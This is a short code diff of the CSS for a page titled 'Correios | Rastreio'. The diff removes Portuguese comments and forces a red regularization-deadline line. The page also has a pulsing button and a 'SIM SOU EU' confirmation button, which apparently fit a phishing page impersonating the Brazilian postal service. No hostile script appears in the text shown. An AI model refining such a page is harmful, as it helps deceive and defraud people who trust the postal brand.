@@ -13,7 +13,6 @@
   <title>Correios | Rastreio</title>
 
   <style>
-    /* Animação para o botão pulsando */
     @keyframes pulsar {
       0% {
         transform: scale(1);
@@ -32,7 +31,6 @@
       animation: pulsar 1s infinite;
     }
 
-    /* Spinner */
     .spinner {
       width: 50px;
       height: 50px;
@@ -49,14 +47,12 @@
       }
     }
 
-    /* Container centralizado */
     main {
       max-width: 1000px;
       margin: 2rem auto;
       padding: 0 1rem;
     }
 
-    /* Tela de resultado */
     #resultado {
       background: #f8f9fa;
       border-radius: 10px;
@@ -91,14 +87,13 @@
       pointer-events: none;
     }
 
-    /* Prazo para regularização em vermelho e fonte reduzida */
+    /* Prazo para regularização em vermelho e forçado */
     #res-prazo {
       font-size: 1rem;
       font-weight: 700;
-      color: red;
+      color: red !important;
     }
 
-    /* Botão "SIM SOU EU" azul */
     #btn-sim-sou-eu {
       margin-top: 1.5rem;
       padding: 0.6rem 1.5rem;
